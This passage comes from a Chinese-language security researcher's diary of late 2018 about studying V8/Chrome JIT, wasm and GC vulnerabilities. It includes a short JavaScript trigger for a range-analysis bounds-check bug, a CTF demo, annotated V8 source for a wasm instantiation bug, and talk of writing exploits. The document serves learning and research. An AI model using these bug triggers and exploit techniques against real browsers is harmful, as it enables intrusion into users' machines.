rel="noopener">https://www.zhihu.com/question/290982869/answer/474629999</a></li><li>最近在调的那个洞，通过改源码，打印遍历路径，确实看到了一些不一样的东西，差不多分析了0.1吧。。明天继续磕</li><li>v8新出了一个wasm的编译器Liftoff好像，又有新东西可以看了ORZ<br><a href="https://v8project.blogspot.com/2018/08/liftoff.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2018/08/liftoff.html</a></li><li>和学长聊天，原来他刚毕业那会还在keen team实习过，那时候科恩还没并入腾讯。</li></ol><h2 id="2018-8-22-23"><a href="#2018-8-22-23" class="headerlink" title="2018-8-22-23"></a>2018-8-22-23</h2><ol><li>这周末就要跑路了，这个洞还没分析的很好，不过还是学到了不少东西。<br>JIT里面的算法相关的代码看了不少了，还读了paper，找到了一些IR的paper读。<br>trace的log基本能看懂不少了。<br>心态平和了很多，虽然我还是看不懂并且很可能一直看不懂ORZ。</li><li>不过总算写好了第一版报告。</li></ol><h2 id="2018-8-24-25"><a href="#2018-8-24-25" class="headerlink" title="2018-8-24-25"></a>2018-8-24-25</h2><ol><li>我一直不是一个很聪明的人，但是我确实是一个喜欢隔一段时间反思一下自己的人，重新审视了一下从7-8月我所学，其实本来我能做的更好，只是因为自己的懒和菜没有看更多，也该收拾心情往前走了。</li></ol><h2 id="2018-8-26-31"><a href="#2018-8-26-31" class="headerlink" title="2018-8-26-31"></a>2018-8-26-31</h2><ol><li>回了一趟学校，把外出实习申请和体测搞完了，然后sky师傅让我准备一个分享。。ORZ，我咋都不会啊，好方，在线等挺急的。</li><li>收到留用短信，还是蛮开心，加油加油。</li><li>v8 GC相关的东西准备看一下，先罗列一下资源</li></ol><ul><li>Are your v8 garbage collection logs speaking to you?Joyee Cheung -Alibaba Cloud(Alibaba Group)<br><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a><br><a href="https://www.youtube.com/watch?v=DSBLAG2IvsY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=DSBLAG2IvsY</a></li><li>Jank Busters Part Two: Orinoco<br><a href="https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.com/2016/04/jank-busters-part-two-orinoco.html</a></li><li>2016 Beijing node live-Chau Yee Cheung-Are Your V8 GC Logs Speaking to You?<br><a href="https://www.youtube.com/watch?v=ZWtvUxl6Pyo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ZWtvUxl6Pyo</a></li><li>垃圾回收的算法与实现<br><a href="http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0" target="_blank" rel="noopener">http://library1.ga/_ads/2CCD392F898D2D1DFAD1271E01CF1CB0</a></li><li>A tour of V8: Garbage Collection<br><a href="http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection" target="_blank" rel="noopener">http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection</a></li><li>Memory management in Blink<br><a href="https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/0e94f26e8/third_party/WebKit/Source/wtf/Allocator.md</a></li><li>V8 —— 你需要知道的垃圾回收机制<br><a href="https://juejin.im/post/5b398981e51d455e2c33136b" target="_blank" rel="noopener">https://juejin.im/post/5b398981e51d455e2c33136b</a></li><li>解读 V8 GC Log（二）: 堆内外内存的划分与 GC 算法<br><a href="https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd" target="_blank" rel="noopener">https://yq.aliyun.com/articles/592880?spm=a2c4e.11153959.0.0.abf75fbdaPONjd</a></li></ul><h2 id="2018-9-1-3"><a href="#2018-9-1-3" class="headerlink" title="2018-9-1-3"></a>2018-9-1-3</h2><ol><li>有点无聊，不想写日记了。</li><li>这两天在看其他phase，审相关的一个新洞，一个不错的攻击面，说不定有洞可以挖。</li><li>和我关系不错的一个同事今天离职了，有点小难过。</li><li>这两天在看了一点编译优化的算法。</li><li>想去蹭北大的课旁听，不知道值得不。<br><a href="https://xiongyingfei.github.io/SA/2017/main.htm" target="_blank" rel="noopener">https://xiongyingfei.github.io/SA/2017/main.htm</a></li><li>R大的回答依然很赞。。<br><a href="https://www.zhihu.com/question/28679215/answer/43883727" target="_blank" rel="noopener">https://www.zhihu.com/question/28679215/answer/43883727</a></li></ol><h2 id="2018-9-4-5"><a href="#2018-9-4-5" class="headerlink" title="2018-9-4-5"></a>2018-9-4-5</h2><ol><li>整理了一下v8的pipeline，重新调试分析了从bytecode-&gt;graph这么一个过程，然后把一个类型混淆导致的OOB写了一下分析。</li><li>看chakra的笔记，明月师傅太棒了。ORZ</li></ol><h2 id="2018-9-6-14"><a href="#2018-9-6-14" class="headerlink" title="2018-9-6-14"></a>2018-9-6-14</h2><ol><li>日记写的越来越少了，感觉慢慢习惯社畜生活√</li><li>做分享用的PPT，把v8 IR/GC等等写了一下，说来今天是v8 10周年来着……</li><li>收到录用电话，以后就是xlabのsakura。</li><li>写了两篇分析给导师，天天审代码ORZ。</li><li>对，我现在就是饿了在等夜宵（6:15)</li><li>这周真是摸鱼……不行不行……要振作！</li><li>以后要习惯早睡了，半夜突然心跳过速，4点多……去医院待到六点多降下来了，还好医生说除了心率快，其他的波形都正常……就是熬夜+焦虑吧。。<br>马上买了个小米手环……强制自己12点睡着，命重要命重要ORZ</li><li>录用函发下来了，等十月中旬谈薪资待遇，乖巧.jpg</li></ol><h2 id="2018-9-15-16"><a href="#2018-9-15-16" class="headerlink" title="2018-9-15-16"></a>2018-9-15-16</h2><ol><li>上周怠惰了一周，下周准备开始从能利用的漏洞开始看了，JIT算法什么的先放一边，然后给自己点高效的正反馈。</li></ol><h2 id="2018-9-17-21"><a href="#2018-9-17-21" class="headerlink" title="2018-9-17-21"></a>2018-9-17-21</h2><ol><li>这周看了几个能利用的漏洞，整理了一下exp写法，龚广那个oob read-&gt;任意地址读写的写法真的好6……，主要在对外发exp的就那么几个人，lokihardt，大宝，龚广，KK。</li><li>今天lw师傅分享了v8 UAF，绝赞，加上v8的wasm整理一下下一阶段的工作，继续学习。</li></ol><h2 id="2018-9-22"><a href="#2018-9-22" class="headerlink" title="2018-9-22"></a>2018-9-22</h2><ol><li>今天整理了一下接下来看什么，先把v8 oob和type confused的几种利用方法和primitive写了一下，ArrayBuffer的backing store这块涉及PartitionAlloc就不是很懂，学习看看。</li></ol><h2 id="2018-9-23-28"><a href="#2018-9-23-28" class="headerlink" title="2018-9-23-28"></a>2018-9-23-28</h2><ol><li>这周主要还是顺着JIT的洞看了一下，主要就是loki交的几个洞。<br>762874是lastIndexOf中Range Analysis出错，本来范围应该是(-1,maxlength)，但是它代码是写的是(-1,maxlength-1)，然后范围分析错了之后，通过简单构造，可以在优化的时候觉得索引始终在数组边界内，于是就在simplifed lowering里reduce掉了checkbounds。<br>但是在新版本v8里，它不会对checkbounds进行消除，加了一个flag，只能在终端启动的时候选择禁用，无法绕过。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  var i = &apos;A&apos;.repeat(2**28 - 16).indexOf(&quot;&quot;, 2**28);</span><br><span class="line">  i += 16; // real value: i = 2**28, optimizer: i = 2**28-1</span><br><span class="line">  i &gt;&gt;= 28; // real value i = 1, optimizer: i = 0</span><br><span class="line">  i *= 100000; // real value i = 100000, optimizer: i = 0</span><br><span class="line">  if (i &gt; 3) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    var arr = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    return arr[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>然后就把typer这块代码顺着大致看了看。</p><p>还调了一个之前异常里触发的callback，bugs:798644<br>然后在for-loop里改掉了array的类型，从DICTIONARY_ELEMENTS-&gt;HOLEY_ELEMENTS。<br>loki用了一个unshift来把dictionary重新compact，patch里是在for-loop里加了一个类型检查，然后在新版v8里unshift不再能重新compact了，这个特性也没了。<br>本质上其实还是一个prerequisite不满足引起的fastpath bug，但是loki能想到这么触发真的很厉害。</p><p>还有一个在InferReceiverMaps因为new.target被直接当成JSFunction处理，但是其实这里可以接收任何带有constructor的JSReceiver，于是就类型混淆了，之前看过，但是没写笔记，也没好好看这个洞能不能利用，就翻出来想调一下重新看一下。</p><p>最后是之前v8 6.9提到的dataview的新特性</p><p>Dataview在6.9版本做了比较大的更新</p><ul><li>runtime从c++迁移到CSA,用torque(一种用于生成CSA的DSL)重写</li><li>JSCall中进行builtin inline</li></ul><p>然后我主要是在审JSCall里对DataView的runtime inline的地方，刚开始看。<br>其他的就想了一些调试看代码的方法，后面我会总结一下写个文档。</p><h2 id="2018-9-29-10-8"><a href="#2018-9-29-10-8" class="headerlink" title="2018-9-29-10-8"></a>2018-9-29-10-8</h2><ol><li>最近主要就是在学漏洞利用，感觉不错，你看，整天搞分析的时候觉得想写利用，现在天天写利用又觉得还是想再做点分析，矛盾++</li><li>博客好久没更新了，文章全都更新在本地了。。不过有v8的问题欢迎一起讨论学习啦（给大佬递茶）。。QQ/Wechat在关于页面有……</li><li>慢慢习惯了现在的工作呢，每天想做就有一堆事情可以做，不想做可以什么都不做……</li></ol><h2 id="2018-10-9-10-27"><a href="#2018-10-9-10-27" class="headerlink" title="2018-10-9-10-27"></a>2018-10-9-10-27</h2><ol><li>整理一下最近学了什么，分析清楚了几个v8的JIT漏洞，暂时把v8的exp学习告一段落了，剩下的都不好写。</li><li>搞了一个无脑杂交的js fuzz，效果还行，出乎我的意料</li><li>漏洞会挖到的。</li></ol><h2 id="2018-10-28-10-29"><a href="#2018-10-28-10-29" class="headerlink" title="2018-10-28-10-29"></a>2018-10-28-10-29</h2><ol><li>整理了一下朋友给我的win kernel exploit资料，准备后面学习一下。<br>win kernel环境搭建<br><a href="https://bbs.pediy.com/thread-247019.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247019.htm</a><br>基础知识<br><a href="https://rootkits.xyz/blog/" target="_blank" rel="noopener">https://rootkits.xyz/blog/</a><br><a href="https://xiaodaozhi.com/" target="_blank" rel="noopener">https://xiaodaozhi.com/</a><br>顺便推一下他的博客。<br><a href="https://www.redog.me/" target="_blank" rel="noopener">https://www.redog.me/</a><br><a href="https://github.com/redogwu/windows_kernel_exploit" target="_blank" rel="noopener">https://github.com/redogwu/windows_kernel_exploit</a></li><li>顺便归档一下其他的资料<br>vm escape资料<br><a href="https://dangokyo.me/2018/03/02/go-for-vm-escape/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/go-for-vm-escape/</a><br>IE漏洞资料<br><a href="https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md" target="_blank" rel="noopener">https://github.com/wnagzihxa1n/BrowserSecurity/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99.md</a></li><li>看了一下seccon2018的wp，艺术字那个题没找到wp，但是trick很多做不来，看了一道入门rop和kidvm；看了一下google ctf2018 Final，两道chrome的题目都不太会做，卒。</li><li>今天上午开了实验室大会，很有意思。</li><li>需要看一下wasm的东西了，blink to do，又是坑<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=826434" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=826434</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=836141" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=836141</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1642" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1642</a></li><li>需要记录一下google ctf2018的一个有趣的challenge。<br>这个赛题应该是涉及两个知识点，一个是v8的range analysis和remove checkBounds<br>一个是浏览器里的浮点数是有精度极限的，合理构造能得到有趣的东西。<br><a href="https://gctf-2018.appspot.com/#challenges/pwn-just-in-time" target="_blank" rel="noopener">https://gctf-2018.appspot.com/#challenges/pwn-just-in-time</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  x = <span class="number">0.1</span>;</span><br><span class="line">  x = x + <span class="number">2</span> + <span class="built_in">Number</span>.MAX_SAFE_INTEGER ;</span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt();</span><br><span class="line">b=opt();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt);</span><br><span class="line">a = opt();</span><br><span class="line">print(b);</span><br><span class="line">print(a);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="number">9007199254740994</span></span><br><span class="line"><span class="number">9007199254740992</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="2018-10-30-11-8"><a href="#2018-10-30-11-8" class="headerlink" title="2018-10-30-11-8"></a>2018-10-30-11-8</h2><ol><li>最近还是在主要花时间写利用和分析JIT上，理解checkbounds remove和checkmaps remove对我帮助很大。似乎能够建立起一套新的利用方式。</li><li>用gdb直接调试手机chrome真的是个大坑。</li></ol><h2 id="2018-11-9-11-10"><a href="#2018-11-9-11-10" class="headerlink" title="2018-11-9-11-10"></a>2018-11-9-11-10</h2><ol><li>看google ctf2018那道题，想完整的调一下chrome上的rce，小书包掏出IDA，现在的最大的问题是我需要逆向出math.cos这样的数学函数来帮我下断点，不然我写不了利用。<br>这可太难了。有没有大佬教教我~</li><li>（11-17日补充）：搞出来了，也没有很难，摊手。</li></ol><h2 id="2018-11-17"><a href="#2018-11-17" class="headerlink" title="2018-11-17"></a>2018-11-17</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-114730.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-115025.jpg" alt=""><br>今天是想说一下天府杯啦，xuanwu lab第二，lw师傅打了三个手机浏览器项目，很厉害，明年我也要打。<br>其实打手机浏览器我已经准备了很多了，很多chrome v8能利用的漏洞，我都在linux上写了exp，剩下的事情并不复杂了，只要能调试和简单的逆向，然后适配手机就OK了。<br>所以其实呢平时多积累1day的exploit是很有意义的一件事情，到用到的时候就简单适配就好了。<br>让我感慨比较多的还是大宝，大宝太强了，他一个人可以搞定所有的浏览器，而且花了并不长的时间学习和搞定了ios的越狱。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-17-120007.png" alt=""><br><a href="https://www.anquanke.com/post/id/149939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/149939</a><br>顺手mark一下他当时的议题，虽然找不到PPT，mosec就是这点不好，完全不公开，只能找到这点资料了。</p><p>我现在在xuanwu lab做的并不是很好，挖v8的洞也挖不到，写利用也用不到我，感觉自己的工作就是完全在自学，比较边缘化，但是大家都是这么过来的，总有需要我忙起来的时候，在那之前我只需要不断的积累积累和积累。</p><p>其实在这里我想提一件好玩的事情，那就是，<strong>如果你不尝试，你永远不知道自己能做到哪一步。</strong><br>看过我日记的话应该知道，我其实只是从今年二三月份才开始调试CVE的，而且是先搞的内核的漏洞，而浏览器漏洞可能在面试之前只搞过两个周多些（可能更短，然后在实习之前又有很多其他杂七杂八的事情干扰了我，比如期末考试），在实习之前才花了些时间补充了一些基础知识，但我知道远远不够。<br>然后我面过了xuanwu lab的浏览器组，似乎也拿到了其他的offer（似乎）<br>在实习的大概四个月里，我学会了如何去审计和分析，积累浏览器特性；<br>学习了如何写一个能跑起来的js fuzz；<br>学会了如何调试chrome，在PC上写一个完整的chrome exploit；<br>一些推特上的大佬给了我不少帮助，感觉大佬们真的是很平易近人了，还有其他朋友和我一起研究了不少东西，我觉得很开心。</p><p>我们这个行业发展是很快的，要跟上前面的人的进度，就必须跑起来，飞快的跑起来。</p><p>后面的打算是，和大宝说的差不多，一是仔细审计和分析学习历史漏洞，找找how to bypass patch的点，二是好好学习一下其他浏览器上的JIT，比如edge比如jsc，重点学习大宝和loki的洞，寻找更多的启发性的点。<br>积累下去，我会变得更好的，我确定。</p><h2 id="2018-11-19"><a href="#2018-11-19" class="headerlink" title="2018-11-19"></a>2018-11-19</h2><ol><li>今天在翻jsc的漏洞exploit，认识了一个越狱大佬，和大佬交流了一下，然后学会了怎么单独编译jsc和怎么找patch。<br>后面预备写一个jsc漏洞利用系列，todo it。</li><li><a href="https://www.w3.org/TR/wasm-js-api-1/" target="_blank" rel="noopener">https://www.w3.org/TR/wasm-js-api-1/</a><br>今天在翻wasm的文档，调试分析<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=766253，看partitionAllocation的头秃，d8还调不了，配了一下windbg的调试环境，搞了一下符号和断点。</a></li><li>感觉有锅（项目），但是估计不是我背锅，继续干活。。困死我了。</li><li>终于找到了，可以写exp了。</li></ol><h2 id="2018-11-22"><a href="#2018-11-22" class="headerlink" title="2018-11-22"></a>2018-11-22</h2><ol><li>这周前两天配调试环境+去医院。</li><li>后两天分析root cause+去医院，倒是找到了root cause和它可能产生的影响，但是到了在partitionAlloc堆上调试exp，又懵了……<br>感觉在做一道非常难的pwn题。。</li></ol><h2 id="2018-11-23"><a href="#2018-11-23" class="headerlink" title="2018-11-23"></a>2018-11-23</h2><ol><li><p>先说结论<a href="https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/base/allocator/partition_allocator/partition_freelist_entry.h?g=0&amp;l=23</a><br>猜我已经全猜出来了，后面整理文档。漏洞很有意思。</p></li><li><p>这个漏洞的root cause就是在一个wasm实例化<code>InstanceBuilder::InstanceBuilder</code>的时候<br>因为触发了一次回调。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int InstanceBuilder::ProcessImports(Handle&lt;FixedArray&gt; code_table,</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">      MaybeHandle&lt;Object&gt; result =</span><br><span class="line">        module_-&gt;is_asm_js() ? LookupImportAsm(index, import_name)</span><br><span class="line">                             : LookupImport(index, module_name, import_name);</span><br></pre></td></tr></table></figure></li></ol><p>于是又进行了一次wasm2的实例化，因为wasm的实例化里有这么一个判断。<br>它会先把已有的compiled_module对象拿来用，首先检查它有没有owner，如果有了就克隆一份。<br>因为我们是在还没有设置owner之前就触发了回调再次实例化，于是两个wasm对象的compiled_module是一样的。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Handle&lt;WasmCompiledModule&gt; original;</span><br><span class="line">    &#123;</span><br><span class="line">      DisallowHeapAllocation no_gc;</span><br><span class="line">      original = handle(module_object_-&gt;compiled_module());</span><br><span class="line">      <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">        owner = handle(WasmInstanceObject::cast(</span><br><span class="line">            original-&gt;weak_owning_instance()-&gt;value()));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (original-&gt;has_weak_owning_instance()) &#123;</span><br><span class="line">      <span class="comment">// Clone, but don't insert yet the clone in the instances chain.</span></span><br><span class="line">      <span class="comment">// We do that last. Since we are holding on to the owner instance,</span></span><br><span class="line">      <span class="comment">// the owner + original state used for cloning and patching</span></span><br><span class="line">      <span class="comment">// won't be mutated by possible finalizer runs.</span></span><br><span class="line">      DCHECK(!owner.is_null());</span><br><span class="line">      ...</span><br><span class="line">      TRACE(<span class="string">"Cloning from %d\n"</span>, original-&gt;instance_id());</span><br></pre></td></tr></table></figure></p><p>在后面grow掉wasm2的buffer的时候，会将两个instance的wasm_memory_reference都改掉。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> RelocInfo::update_wasm_memory_reference(</span><br><span class="line">    Isolate* isolate, Address old_base, Address new_base,</span><br><span class="line">    ICacheFlushMode icache_flush_mode) &#123;</span><br><span class="line"><span class="comment">//  DCHECK(IsWasmMemoryReference(rmode_));</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new_base is :%p\n"</span>,new_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"old_base is :%p\n"</span>,old_base);</span><br><span class="line">  Address updated_reference = new_base + (wasm_memory_reference() - old_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"updated_reference is:%p\n"</span>,updated_reference);</span><br><span class="line">  <span class="comment">// The reference is not checked here but at runtime. Validity of references</span></span><br><span class="line">  <span class="comment">// may change over time.</span></span><br><span class="line">  set_embedded_address(isolate, updated_reference, icache_flush_mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体的还要再看看，剩下主要还是在看partitionAlloc，<br>利用基本上是搞明白了，一些细节的东西还是要整理一下。</p><ol><li>组会被问chrome sandbox escape，啥都不会的我。。太菜了ORZ</li><li>这周基本上就是在调试wasm的漏洞，和实现一个arraybuffer oob r/w的exp吧，后者geohot在2014年就搞过了23333.</li></ol><h2 id="2018-11-27"><a href="#2018-11-27" class="headerlink" title="2018-11-27"></a>2018-11-27</h2><ol><li>这一周基本上都在医院辗转度过……考虑是植物神经紊乱吧。<br>摸鱼休息，调整饮食和作息，锻炼身体，不知不觉已经老了ORZ。<br>说到底。。经常凌晨三四点睡觉还不吃早饭。。能苟活到现在我也太幸运了。。</li><li>可惜了realworld ctf，估计是不能去了，这段时间还是养病重要。。要吃清淡了。。趴桌</li><li>把partitionAlloc大概看了看，基本没问题了，利用也基本写完了，不过在任意地址读写的原语之后，如何得到一个完整的exp，还要商榷一下，windbg很厉害。。’dx -r1 isolate’<br>cheat engine也很厉害……<br>不过说来调的时候发现了很多有意思的东西，可以顺手再逆一下chrome了。<br>另外在看之前的东西的时候，发现typedArray的elements里原来就有存arraybuffer的backingstore，越界直接写这里就行了。。</li><li>准备看下天府杯的那个洞了，基本上定位到了patch，这两天调一下看看。</li><li>试图编译chrome apk，然后用来恢复符号，看看能不能在国产手机浏览器上找到点有用的调试符号。这个真的是很头疼呀，也不太好意思问同事，趴桌。</li></ol><h2 id="2018-11-30"><a href="#2018-11-30" class="headerlink" title="2018-11-30"></a>2018-11-30</h2><ol><li>一周结束了，整理一下这周，最近十点睡八点起，过得很有规律，也挺好的，身体也在康复中，很遗憾realworld ctf不能去了，多休息吧。</li><li>在最新版chrome上面写了exp，简单的栈劫持+mprotect弹计算器，挺开心的。</li><li>说来大概从开始写利用也搞了两个月了，稍微有点进度感人，但是总算还是搞的差不多了，对GC管理还要再熟悉，不过很开心了。</li><li>接下来主要看看chrome sandbox escape fuzz，然后loki最近在挖jsc的漏洞，这个也值得好好学习一下。</li><li>最近似乎经常有人问我二进制怎么入门……之前看过一个杨博士以前说的，手写一个cpu，手写一个内核，手写一个编译器，然后我觉得最好再手写一个STL库。然后就入门了（逃</li></ol><h2 id="2018-12-3"><a href="#2018-12-3" class="headerlink" title="2018-12-3"></a>2018-12-3</h2><ol><li>扁桃体发炎的我完美错过realworld ctf，熬夜熬的ORZ<br>看了看rw的赛题，safari jsc那道题基本上就是抄的saelo p2o2018的漏洞造的洞，clobeerWorld代表删除之前做出的任何关于类型信息的假设,然后长亭造的这个洞把它删掉了，即假定在for-in循环中检索对象的property是没有副作用的，感觉比v8里好懂多了…<br>exp如果不是因为最近的那个缓解机制的话，应该复制粘贴就能写了。。23333</li><li>病了两周的我今天在补笔记，很多细节忘干净了。ORZ</li></ol><h2 id="2018-12-4"><a href="#2018-12-4" class="headerlink" title="2018-12-4"></a>2018-12-4</h2><ol><li>今天因为学校要交材料回去补第七学期外出实习的证明，置换学分。所以感慨一下，自己的人生好像在走钢丝，一不小心就GG了<br>熟悉我的人可能知道，我学校很一般23333<br>我的小伙伴也觉得：没有强大的背景和资源倒不一定意味着没有前途，只是容错率低得多罢了，在别人探索人生享受诗和远方的时候就不得不找准一条路走到黑，一个环节出了问题，就GG了<br>为什么同样是这个行业，有的人就不会焦虑，因为差距呀。</li><li>然后一件开心的事情是，我导师今天终于和我聊了一下，我还以为我被忘了23333，继续努力就是了。<br>没什么可以选择的，就算掉下去了，我能做的，也只有让自己不要摔的太惨而已。</li><li>补了cve-2017-15401的笔记，完全是windbg和cheatengine写出来的exp可还行（滑稽</li></ol><h2 id="2018-12-5"><a href="#2018-12-5" class="headerlink" title="2018-12-5"></a>2018-12-5</h2><ol><li>龚神的洞看不懂。</li><li>最近在一种思路出了好几个洞，也是厉害，在我觉得没东西看的时候，突然爆炸。。</li></ol><h2 id="2018-12-9"><a href="#2018-12-9" class="headerlink" title="2018-12-9"></a>2018-12-9</h2><ol><li>最近仔细看了看，龚神的洞是worker的序列化和反序列化的问题，这个点从来也没去看过，感觉大家估计也不懂这个东西该怎么用，还是很神奇的一件事情。</li><li>最近对逻辑漏洞十分感兴趣，得益于同事花了两天挖到了一个windows的提权0day</li><li>sqlite的漏洞，可以拿来打Chrome，之前看过一点相关的东西<br><a href="https://worthdoingbadly.com/sqlitebug/" target="_blank" rel="noopener">https://worthdoingbadly.com/sqlitebug/</a></li></ol><h2 id="2018-12-10-17"><a href="#2018-12-10-17" class="headerlink" title="2018-12-10-17"></a>2018-12-10-17</h2><ol><li>最近就一直在解决1710的exp的问题，解决不了，陷入自闭。。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></li><li>今天休息一下看看safari 0.5day。<br><a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://phrack.org/papers/attacking_javascript_engines.html</a><br><a href="https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html" target="_blank" rel="noopener">https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html</a></li></ol><h2 id="2018-12-17-26"><a href="#2018-12-17-26" class="headerlink" title="2018-12-17-26"></a>2018-12-17-26</h2><ol><li>最近一直在摸鱼，群星真好玩.jpg，然后在找方向，一直以来靠分析漏洞和写利用来续了一波命，但是还是没搞懂该怎么挖洞，也没人能告诉我chrome v8的洞怎么挖，论编程的能力，这两年在学校靠自己真的没锻炼出啥来，突然开始意识到自己基础薄弱什么都不会了。<br>别人在学校的时候，就通过上课+实验的方式打了很好的基础，而我……感觉一路走来都是自己一个人xjb搞，偶尔和师傅们交流一下，方向上感觉没什么大的问题，就是真的，嗯，我太弱了。希望大家不要犯这种错误了，但是要是再来一次的话，我还是会选择先进实验室再说。</li><li>操作系统基础学习资料，顺便安利CSAPP<br><a href="https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/" target="_blank" rel="noopener">https://nju-ics.gitbooks.io/ics2016-programming-assignment/content/</a><br><a href="https://github.com/Changochen/nju-pa" target="_blank" rel="noopener">https://github.com/Changochen/nju-pa</a></li><li>逻辑漏洞学习，顺便安利James Forshaw，一直想学也一直没学，就先todo list了<br><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf</a></li><li>工控协议Fuzz的一个比较有趣的资料？<br><a href="https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg</a></li><li>想学fuzz，等35C3 talk的PPT。</li></ol><h2 